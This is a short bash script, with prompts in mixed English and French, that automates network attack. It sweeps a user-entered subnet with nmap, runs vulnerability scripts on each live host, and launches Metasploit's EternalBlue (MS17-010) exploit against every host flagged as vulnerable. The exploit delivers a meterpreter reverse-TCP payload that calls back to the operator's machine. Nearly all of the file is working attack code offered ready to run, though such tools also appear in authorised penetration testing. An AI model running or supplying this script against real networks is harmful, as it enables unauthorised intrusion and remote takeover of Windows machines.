#!/bin/bash

printf '

__  __                  _        __ __
\ \/ /___ _____  ____  (_)____  / //_/
 \  / __ `/ __ \/ __ \/ / ___/ / ,<
 / / /_/ / / / / / / / (__  ) / /| |
/_/\__,_/_/ /_/_/ /_/_/____(_)_/ |_|

'

IP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)
while :;do
echo "Please enter a subnetwork (Ex: 192.168.10.0) : "
read sr
if [[ $sr =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0]+$ ]]; then
break
fi
done

while :;do
echo "Veuillez saisir le bit de sous-réseau : "
read bsr
if [[ $bsr =~ ^[0-9]{1,2}+$ ]]; then
break
fi
done

BSR="$sr/$bsr"

echo ""
echo "==..25%"
nmap -sn $BSR --exclude $IP | awk '/Nmap scan report for / {print $5}' > hostup.txt

SEQ=$(wc -l hostup.txt | awk '{print $1}')

echo""
echo "Toutes les machines UP sont analysées, cela peut durer quelques minutes..."
echo "====..50%"

for i in $(seq 1 $SEQ);do
LINE=$(cat hostup.txt | awk "NR==$i")
nmap -v --script vuln $LINE > LINE$i.txt
done

echo""
echo "======..75%"

for i in $(seq 1 $SEQ);do
STRING="| smb-vuln-ms17-010:"
LINE=$(cat hostup.txt | awk "NR==$i")
if [[ ! -z $(grep "$STRING" "LINE$i.txt") ]]; then
echo""
echo "$LINE are vulnerable to MS17_010"
sleep 2
echo""
echo "An exploit will be launched in a new terminal"
sleep 2
gnome-terminal -- bash -c "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set lhost $IP ; set rhost $LINE ; set lport 444$i ; exploit ; '; exec bash"
else
echo""
echo "$LINE are not vulnerable";
sleep 1

fi
done

rm hostup.txt
rm LINE*.txt
sleep 2
echo""
echo "========100%"
sleep 1
echo""
echo "Bye"
